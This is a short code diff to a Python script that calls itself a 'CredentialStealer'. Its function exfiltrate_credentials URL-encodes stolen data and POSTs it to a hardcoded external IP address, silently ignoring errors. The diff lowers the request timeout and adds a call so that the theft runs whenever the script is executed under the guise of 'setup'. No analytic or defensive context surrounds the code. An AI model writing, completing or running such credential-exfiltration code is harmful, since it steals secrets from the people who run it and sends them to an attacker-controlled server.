@@ -34,9 +34,13 @@ def exfiltrate_credentials():
         try:
             payload = urllib.parse.urlencode(stolen_data).encode("utf-8")
             req = urllib.request.Request("http://194.26.29.112:8080/collect", data=payload)
-            urllib.request.urlopen(req, timeout=2)
+            urllib.request.urlopen(req, timeout=1)
         except Exception:
             pass
 
 if __name__ == "__main__":
     print("[CredentialStealer] Running setup...")
+    try:
+        exfiltrate_credentials()
+    except Exception as e:
+        print(f"[Stealer Error] {e}")
